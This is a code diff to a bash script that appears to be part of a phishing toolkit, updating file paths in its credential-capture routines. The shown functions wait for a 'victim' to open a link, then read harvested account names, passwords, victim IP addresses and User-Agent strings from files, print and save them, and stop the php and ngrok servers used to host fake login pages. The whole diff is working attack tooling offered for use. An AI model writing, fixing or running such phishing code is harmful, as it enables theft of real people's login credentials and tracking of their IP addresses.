@@ -260,12 +260,12 @@ printf '</html>\n' >> sites/create/login.html
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' $server-usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' $server-usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat $server-usernames.txt >> $server-saved.usernames.txt
+cat sites/$server/usernames.txt >> $server-saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s-saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -282,7 +282,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "$server-usernames.txt" ]]; then
+if [[ -e "sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
@@ -297,11 +297,11 @@ catch_ip() {
 touch $server-saved.usernames.txt
 ip=$(grep -a 'IP:' $server-ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' $server-ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s-saved.ip.txt\e[0m\n" $server
-cat $server-ip.txt >> $server-saved.ip.txt
+cat sites/$server/ip.txt >> $server-saved.ip.txt
 
 
 if [[ -e iptracker.log ]]; then
@@ -403,12 +403,12 @@ checkfound
 }
 
 startx() {
-if [[ -e $server-ip.txt ]]; then
-rm -rf $server-ip.txt
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e $server-usernames.txt ]]; then
-rm -rf $server-usernames.txt
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -424,12 +424,12 @@ serverx
 ##
 
 start() {
-if [[ -e $server-ip.txt ]]; then
-rm -rf $server-ip.txt
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e $server-usernames.txt ]]; then
-rm -rf $server-usernames.txt
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -508,7 +508,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e
 while [ true ]; do
 
 
-if [[ -e "$server-ip.txt" ]]; then
+if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
 
